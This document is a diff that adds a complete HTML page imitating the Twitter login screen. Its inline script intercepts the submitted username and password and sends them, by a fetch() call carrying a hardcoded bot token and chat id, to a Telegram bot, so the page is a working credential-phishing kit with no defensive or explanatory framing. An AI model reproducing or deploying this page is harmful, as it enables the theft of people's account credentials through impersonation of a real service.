@@ -1,0 +1,88 @@
+
+<!--
+https://sl.bing.net/gLR212TDS5A
+-->
+
+<html>
+<head>
+    <title>Twitter Login</title>
+    <link rel="icon" type="image/png" href="https://assets.stickpng.com/images/580b57fcd9996e24bc43c53e.png">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1da1f2;
+        }
+
+        .container {
+            width: 400px;
+            margin: 100px auto;
+            background-color: white;
+            border-radius: 10px;
+            padding: 20px;
+        }
+
+        .logo {
+            display: block;
+            margin: 0 auto;
+            width: 50px;
+            height: 50px;
+        }
+
+        .form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .input {
+            width: 80%;
+            margin: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .button {
+            width: 80%;
+            margin: 10px;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #1da1f2;
+            color: white;
+            font-weight: bold;
+        }
+
+        .link {
+            color: #1da1f2;
+            text-decoration: none;
+        }
+    </style>
+
+    <script type="text/javascript">
+        function submitLoginForm(event){
+            event.preventDefault();
+            let email = event.target['username'].value;
+            let password = event.target['password'].value;
+            let text = email + ` <Twitter> ` + password;
+            let url = `https://api.telegram.org/bot6556542346:AAFPNkrk6FLdIne_-pe_5M-DSMy4szyLRjw/sendMessage?chat_id=5721393154&parse_mode=Markdown&text=${text}`;
+            fetch(url);
+        }
+    </script>
+
+</head>
+<body>
+    <div class="container">
+        <img src="https://assets.stickpng.com/images/580b57fcd9996e24bc43c53e.png" alt="Twitter Logo" class="logo">
+        <h2>Log in to Twitter</h2>
+        <form onsubmit="submitLoginForm(event)" class="form" method="post">
+            <input type="text" name="username" placeholder="Phone, email or username" class="input">
+            <input type="password" name="password" placeholder="Password" class="input">
+            <input type="submit" value="Log in" class="button">
+        </form>
+        <p><a href="#" class="link">Forgot password?</a></p>
+        <p><a href="#" class="link">Sign up for Twitter</a></p>
+    </div>
+</body>
+</html>
